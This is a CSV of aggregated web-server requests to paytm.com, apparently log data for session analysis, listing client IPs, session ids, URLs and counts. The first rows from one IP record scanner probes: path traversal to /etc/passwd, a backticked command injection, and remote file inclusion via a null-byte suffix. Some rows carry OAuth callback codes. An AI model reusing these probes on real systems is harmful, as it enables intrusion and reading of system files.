clientIp,sessionId,request,count(request)
106.51.132.54,7,https://paytm.com:443/shop/g/home-kitchen/invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././min-55-cashback-on-bedsheets,1
106.51.132.54,7,https://paytm.com:443/%60cat%20%2fetc%2fpasswd%60/meru/,1
106.51.132.54,7,https://paytm.com:443/http%3a%2f%2ftestasp.vulnweb.com%2ft%2ffit.txt%3f%2500.jpg/meru/,1
106.67.4.80,8,https://paytm.com:443/shop/p/van-heusen-blue-cotton-formal-shirt-size-40-APPVAN-HEUSEN-BTREN50996F0AD08C2,1
106.78.214.145,8,https://paytm.com:443/shop/cart?channel=web&version=2,1
117.200.249.179,24,https://paytm.com:443/papi/v1/promosearch/product/9318967/offers?parent_id=9316893&price=1545&channel=web&version=2,1
120.59.220.16,28,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,1
122.166.60.196,29,https://paytm.com:443/,1
122.168.222.216,29,https://paytm.com:443/offer/wp-content/uploads/2015/07/eoss_620x443.jpg,1
122.168.222.216,29,https://paytm.com:443/offer/wp-content/plugins/images-thumbnail-sliderv1/js/jc.js?ver=4.2.2,1
122.175.147.199,29,https://paytm.com:443/offer/wp-content/plugins/really-simple-facebook-twitter-share-buttons/style.css?ver=4.2.2,1
122.175.147.199,29,https://paytm.com:443/?utm_medium=affiliate&utm_source=Netcore_mailer&utm_campaign=ElectronicSale-20072015&utm_term=aff3-E,2
167.230.140.7,46,https://paytm.com:443/shop/logout?channel=web&version=2,1
180.215.165.152,58,https://paytm.com:443/shop/cart?channel=web&version=2,1
202.131.103.131,71,https://paytm.com:443/shop/orderdetail/1097950351?actions=1&channel=web&version=2,1
203.217.137.18,72,https://paytm.com:443/papi/rr/products/7238829/statistics?channel=web&version=2,1
203.99.198.17,74,https://paytm.com:443/offer/wp-content/uploads/2015/07/offer-page_20jul.jpg,1
223.176.3.130,77,https://paytm.com:443/shop,1
27.49.2.135,78,https://paytm.com:443/shop/login?isIframe=true&theme=mp-web,1
49.201.187.62,81,https://paytm.com:443/papi/v1/promosearch/product/8659937/offers?parent_id=6816811&price=10786&channel=web&version=2,1
54.169.78.51,82,https://paytm.com:443/shop/p/d-link-dir-605l-300-mbps-n-300-wireless-router-black-D-LINK_DIR-605L_300MBPS_BLACK_44293,1
54.169.78.51,82,https://paytm.com:443/shop/p/wd-my-passport-ultra-wdbzfp0010btt-1-tb-portable-external-hard-drive-titanium-WD_PassportUltra_1TB_Titanium_37722,1
54.169.78.51,82,https://paytm.com:443/shop/p/sony-cp-v5-bc-5000-mah-power-bank-for-phones-black-MOBSONY-CP-V5-BDUMM1418C602DBC_50080,1
54.169.78.51,82,https://paytm.com:443/shop/p/blackberry-z3-black-BLACKBERRY_Z3_8GB_BLACK_197,1
54.169.78.51,82,https://paytm.com:443/shop/p/lenovo-g50-30-80g001ntin-pentium-quad-core-3rd-gen-4-gb-500-gb-15-5-inch-windows-8-1-black-LAPLENOVO-G50-3DUMM202567423A48E_35235,1
60.254.68.31,84,https://paytm.com:443/papi/rr/products/13156205/statistics?channel=web&version=2,1
60.254.68.31,84,https://paytm.com:443/papi/rr/products/16281822/statistics?channel=web&version=2,1
103.18.71.182,5,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/css/style.css?ver=1.26,1
106.51.178.167,9,https://paytm.com:443/,1
117.196.234.73,15,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/css/style-admin.css?ver=4.2.2,1
117.199.74.131,16,https://paytm.com:443/shop,2
119.235.49.42,18,https://paytm.com:443/papi/v1/promosearch/product/13307552/offers?parent_id=13307553&price=499&channel=web&version=2,1
120.60.187.0,19,https://paytm.com:443/,3
122.165.52.64,21,https://paytm.com:443/shop/wallet/balance?channel=web&version=2,1
122.172.180.17,22,https://paytm.com:443/offer/wp-content/uploads/2014/12/slider-pro.min_.css,1
124.125.251.116,24,https://paytm.com:443/shop/orderhistory?pagesize=10&channel=web&version=2,1
14.141.45.138,26,https://paytm.com:443/shop/cart,12
168.235.197.81,35,http://paytm.com:80/images/spinner.gif,1
182.64.90.212,39,https://paytm.com:443/offer/wp-content/uploads/2015/06/but_1.png,1
182.64.90.212,39,https://paytm.com:443/offer/wp-content/plugins/wp-social-sharing/static/socialshare.js?ver=1.3,1
188.40.135.194,43,https://paytm.com:443/papi/rr/products/6056208/statistics,1
188.40.135.194,44,https://paytm.com:443/papi/v1/promosearch/product/5038919/offers?parent_id=6758191&price=2845,1
223.30.129.82,55,https://paytm.com:443/papi/rr/products/17446231/statistics?channel=web&version=2,1
223.30.129.82,55,https://paytm.com:443/papi/nps/merchantrating?merchant_id=28124&channel=web&version=2,1
223.30.92.226,55,https://paytm.com:443/shop/logout?channel=web&version=2,1
27.109.30.70,57,https://paytm.com:443/favicon.ico,1
27.97.245.1,58,https://paytm.com:443/shop/cart?channel=web&version=2,1
43.249.224.149,62,https://paytm.com:443/shop/orderdetail/1118078587?channel=web&version=2,2
49.204.9.140,65,https://paytm.com:443/papi/nps/merchantrating?merchant_id=21259&channel=web&version=2,1
52.74.59.227,67,https://paytm.com:443/shop/p/gionee-m2-white-GIONEE_M2_4GB_WHITE_22496,1
52.74.59.227,67,https://paytm.com:443/shop/p/d-link-dir-605l-wireless-n300-cloud-router-COMD-LINK-DIR-6RAJ-486134BD555D6,1
52.74.59.227,67,https://paytm.com:443/shop/p/d-link-dsl-2750u-wireless-n-adsl2-4-port-wi-fi-router-D-LINK_NADSL24-PORTWI-FIROUTER_NULL_NULL_30215,1
52.74.59.227,67,https://paytm.com:443/shop/p/iball-6351-q40-tablet-grey-MOBIBALL-6351-QSANS34691978F37BE,1
52.74.59.227,67,https://paytm.com:443/shop/p/lg-hbs-730-bluetooth-headset-black-LG_INEAR_WIRELESS_BLACK_38711,1
52.74.59.227,67,https://paytm.com:443/shop/p/intex-aqua-y3-black-CMPLXMOBINTEX-AQUA-YGOLY24699E8F3142B,1
52.74.59.227,67,https://paytm.com:443/shop/p/sony-xperia-c3-white-SONY_XPERIAC3_8GB_WHITE_31022,1
52.74.59.227,67,https://paytm.com:443/shop/p/micromax-x253-white-MICROMAX_X253_NULL_WHITE_33804,1
52.74.59.227,67,https://paytm.com:443/shop/p/intex-aqua-amaze-black-INTEX_AQUAAMAZE_8GB_BLACK_20945,1
52.74.59.227,68,https://paytm.com:443/shop/p/micromax-a104-gold-fire2-white-MICROMAX_A104GOLDFIRE2_1GB_WHITE_23789,1
52.74.59.227,68,https://paytm.com:443/shop/p/philips-gc1905-1440-w-steam-iron-white-blue-PHILIPS_GC1905_NULL_WHITEANDBLUE_24832,1
52.74.59.227,68,https://paytm.com:443/shop/p/sony-cyber-shot-dsc-w830-20-1-mp-point-shoot-camera-silver-SONY_DSC-W830_NULL_SILVER_45511,1
52.74.59.227,68,https://paytm.com:443/shop/p/hp-15-r032tx-ci3-4th-gen-4gb-500gb-2gb-graph-win8-1-black-HP_15R032TX_4GBDDR3_BLACK_21252,1
52.74.59.227,68,https://paytm.com:443/shop/p/micromax-bolt-d321-4-gb-white-MOBMICROMAX-BOLDUMM141B6A46CCE_36530,1
52.74.59.227,68,https://paytm.com:443/shop/p/lg-g3-32-gb-white-LG_D855_32GB_WHITE_21193_21550,1
52.74.59.227,69,https://paytm.com:443/shop/p/samsung-galaxy-star-advance-b350-white-SAMSUNG_STARADVANCEB350_4GB_WHITE_21318,1
59.96.0.33,69,https://paytm.com:443/shop/cart?channel=web&version=2,2
66.249.71.110,73,https://paytm.com:443/shop/p/radhika-black-cotton-leggings-CMPLXAPPRADHIKA-BLACNKM-243173F41CDC0,1
66.249.71.110,73,https://paytm.com:443/shop/p/ambica-fashion-glamorous-blue-brasso-and-silk-saree-WSAREE0000002041ADBLFR,1
1.23.18.27,0,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
1.39.97.64,4,https://paytm.com:443/offer/wp-content/plugins/owl-carousel/css/owl.carousel.css?ver=4.2.2,1
106.208.157.223,16,https://paytm.com:443/shop/cart,1
106.210.85.127,16,https://paytm.com:443/shop?utm_source=Affiliates&utm_medium=Payoom&utm_campaign=Payoom,1
111.93.59.94,19,https://paytm.com:443/offer/wp-content/plugins/wonderplugin-carousel/engine/wonderplugincarousel.js?ver=3.8,1
111.93.59.94,20,https://paytm.com:443/shop/g/electronics/the-electronic-store/carousal/laptops-up-to-18-cashback,1
115.250.54.100,25,https://paytm.com:443/offer/wp-includes/js/jquery/ui/core.min.js?ver=1.11.4,1
122.162.62.184,37,https://paytm.com:443/favicon.ico,1
14.139.110.34,37,https://paytm.com:443/api/oauth2/user/clients?channel=web&version=2,2
150.242.151.14,49,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/css/magnific-popup.css?ver=0.9.9,1
160.83.97.83,50,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/css/magnific-popup.css?ver=0.9.9,1
160.83.97.83,50,https://paytm.com:443/offer/wp-content/uploads/2015/07/qas.jpg,1
164.100.133.253,51,https://paytm.com:443/offer/wp-content/uploads/2015/07/qas.jpg,1
182.64.212.64,57,https://paytm.com:443/offer/wp-includes/js/jquery/ui/mouse.min.js?ver=1.11.4,1
182.72.186.74,60,https://paytm.com:443/shop/orderdetail/1115782350?channel=web&version=2,1
182.74.128.66,60,https://paytm.com:443/shop/action,1
183.82.85.29,63,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/css/style-admin.css?ver=4.2.2,1
183.87.126.235,63,https://paytm.com:443/online-tata-photon-plus-recharge.htm,1
27.255.135.206,82,https://paytm.com:443/styles/app.css,1
59.94.222.158,92,https://paytm.com:443/shop/cart?channel=web&version=2,1
103.18.120.184,7,https://paytm.com:443/offer/wp-content/plugins/wc-gallery/includes/js/owlcarousel/assets/owl.carousel.min.css?ver=2.0.0,2
106.219.38.2,12,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/css/images-responsive-thumbnail-slider-plus-lighbox-style.css?ver=4.2.2,1
106.219.38.2,12,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/css/style-admin.css?ver=4.2.2,1
106.51.131.52,12,https://paytm.com:443/offer/wp-content/plugins/wp-awesome-faq/jquery-ui.css?ver=4.2.2,1
106.51.133.243,12,https://paytm.com:443/shop/cart?channel=web&version=2,1
106.76.242.174,12,https://paytm.com:443/shop/cart,1
106.79.177.99,12,https://paytm.com:443/shop/g/electronics/computers-accessories/computer-accessories/routers,1
112.133.211.120,17,https://paytm.com:443/offer/wp-content/plugins/image-slider-responsive/js/jquery.flexslider-min.js?ver=4.2.2,1
115.250.20.255,21,https://paytm.com:443/favicon.ico,1
117.194.2.217,24,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/images/vl-box/controls.png,1
117.205.241.88,26,https://paytm.com:443/papi/v1/promosearch/product/16227281/offers?parent_id=13095467&price=148&channel=web&version=2,1
117.211.161.150,26,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,1
117.222.78.119,28,https://paytm.com:443/shop/cart,1
117.254.77.12,28,https://paytm.com:443/shop/action,1
120.29.232.107,36,https://paytm.com:443/shop/wallet/txnhistory?page_size=10&page_number=0&channel=web&version=2,1
122.166.104.27,40,https://paytm.com:443/papi/nps/merchantrating?merchant_id=21258&channel=web&version=2,2
122.170.159.220,40,https://paytm.com:443/shop/h/electronics/pendrives-hard-disks-memory-cards,1
14.139.60.61,40,https://paytm.com:443/offer/wp-content/plugins/really-simple-facebook-twitter-share-buttons/images/specificfeeds_follow.png,1
14.140.216.4,40,https://paytm.com:443/api/v1/expresscart/checkout?wallet=1,1
145.62.32.129,43,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/css/l-box-css.css?ver=4.2.2,1
223.185.244.15,61,https://paytm.com:443/offer/wp-content/plugins/easy-logo-slider/js/jquery.jcarousel.min.js?ver=4.2.2,1
37.228.106.165,62,https://paytm.com:443/offer/wp-content/plugins/wonderplugin-carousel/engine/lightbox-next.png,1
59.185.238.65,67,https://paytm.com:443/papi/nps/merchantrating?merchant_id=25058&channel=web&version=2,1
59.89.204.137,68,https://paytm.com:443/shop/login?isIframe=true&theme=mp-html5,1
1.38.22.65,1,https://paytm.com:443/offer/wp-includes/js/jquery/ui/resizable.min.js?ver=1.11.4,1
106.66.186.47,9,https://paytm.com:443/shop/ad/paytmAd?cat=bus1&paytm=new,1
107.150.4.173,11,https://paytm.com:443/papi/v1/promosearch/product/2636968/offers?channel=web&version=2,1
112.79.38.115,19,https://paytm.com:443/papi/v1/expresscart/verify,1
116.203.96.54,23,https://paytm.com:443/shop/v1/frequentorders?channel=web&version=2,2
122.167.99.50,27,https://paytm.com:443/offer/wp-content/themes/twentytwelve/style.css?ver=4.2.2,1
122.179.162.1,27,https://paytm.com:443/papi/rr/products/17130196/statistics?channel=web&version=2,1
122.181.21.78,29,https://paytm.com:443/favicon.ico,1
123.237.141.222,29,https://paytm.com:443/shop/logout?channel=web&version=2,1
14.96.117.63,32,https://paytm.com:443/shop/authresponse?code=34971c2c-523c-4080-abe1-17fd2fe01f52&state=null,1
182.73.111.134,42,https://paytm.com:443/shop/g/electronics/mobile-accessories/mobiles-accessories-store/price-never-before?gclid=CKin8ZLI7sYCFcKWvQod5C0N2Q,1
202.88.244.36,46,https://paytm.com:443/shop,1
204.94.39.138,46,https://paytm.com:443/offer/wp-content/plugins/wp-image-slider-with-lightbox/css/slider-plus-lightbox-style.css?ver=4.2.2,1
27.6.23.10,49,https://paytm.com:443/papi/rr/products/13832989/statistics?channel=web&version=2,1
49.206.247.60,51,https://paytm.com:443/favicon.ico,1
77.109.141.138,54,https://paytm.com:443/offer/wp-content/plugins/wp-responsive-slider-with-lightbox/js/images-responsive-thumbnail-slider-plus-lightbox-jc.js?ver=4.2.2,1
92.24.203.224,59,https://paytm.com:443/papi/rr/products/10772712/statistics?channel=web&version=2,1
1.38.19.229,0,https://paytm.com:443/shop/orderdetail/1116534576?channel=web&version=2,1
101.212.72.9,7,https://paytm.com:443/emami,1
103.37.201.65,11,https://paytm.com:443/shop/orderdetail/1117909364?channel=web&version=2,1
106.219.33.22,13,https://paytm.com:443/shop/g/electronics/mobile-accessories/mobiles-accessories-store/price-never-before?gclid=CI7jvd6Q78YCFUhgfgodonIAuQ,1
107.167.102.150,14,https://paytm.com:443/offer/wp-content/plugins/wonderplugin-carousel/engine/wonderplugincarouselskins.js?ver=3.8,1
107.167.108.242,14,http://www.paytm.com:80/,3
111.93.188.66,25,https://paytm.com:443/offer/wp-content/plugins/wp-awesome-faq/accordion.js?ver=1,1
115.245.8.51,41,https://paytm.com:443/papi/v1/promosearch/product/16455341/offers?parent_id=0&price=690&channel=web&version=2,1
117.198.105.223,42,https://paytm.com:443/266x346null.webp,1
117.204.57.228,42,https://paytm.com:443/images/greyStar.png,1
117.204.57.228,42,https://paytm.com:443/shop/orderdetail/1116543643?channel=web&version=2,1
117.212.206.91,42,https://paytm.com:443/undefined,1
117.218.63.17,42,https://paytm.com:443/papi/rr/products/15581196/statistics?channel=web&version=2,1
120.88.34.122,44,https://paytm.com:443/papi/v1/promosearch/product/4805657/offers?parent_id=0&price=1099&channel=web&version=2,1
122.171.127.68,50,https://paytm.com:443/shop/cart?channel=web&version=2,1
41.45.61.192,79,https://paytm.com:443/shop/cart?channel=web&version=2,1
49.213.57.125,81,https://paytm.com:443/shop/authresponse?code=b2d7983a-4963-43fc-8c5a-272f4ab6df64&state=null,1
49.213.57.125,82,https://paytm.com:443/shop/cart?channel=web&version=2,7
52.74.219.71,82,https://paytm.com:443/shop/p/philips-qg-5115-beard-trimmer-CMPLXPHILIPS_QG5115_NULL_NULL,1
52.74.219.71,82,https://paytm.com:443/papi/v1/promosearch/product/4295081/offers?parent_id=4295129&price=5115,1
52.74.219.71,82,https://paytm.com:443/papi/v1/promosearch/product/13543057/offers?parent_id=10333698&price=9399,1
52.74.219.71,82,https://paytm.com:443/papi/v1/promosearch/product/6915955/offers?parent_id=0&price=3620,1
52.74.219.71,82,https://paytm.com:443/papi/v1/promosearch/product/10426234/offers?parent_id=10426235&price=2499,1
52.74.219.71,82,https://paytm.com:443/shop/p/titan-raga-silver-watch-WATTITAN-RAGA-SGRAB461237F24D4A,1
52.74.219.71,82,https://paytm.com:443/papi/v1/promosearch/product/9288658/offers?parent_id=9288671&price=4950,2
52.74.219.71,82,https://paytm.com:443/shop/p/touch-trends-blue-chanderi-silk-unstitched-suit-set-APPTOUCH-TRENDSTOUC2888988D96810,1
52.74.219.71,82,https://paytm.com:443/papi/v1/promosearch/product/9487493/offers?parent_id=14233407&price=2399,1
52.74.219.71,82,https://paytm.com:443/shop/p/handloomdaddy-1-piece-set-of-yellow-cotton-towel-with-embriodery-design-HOTHRS0GRTWL01YSHDYLFR,1
52.74.219.71,82,https://paytm.com:443/papi/v1/promosearch/product/9297443/offers?parent_id=9297448&price=2210,1
52.74.219.71,83,https://paytm.com:443/shop/p/dell-wm123-wireless-black-with-gray-accents-cmplxdell_wm123_null_blackwithgrayaccents,2
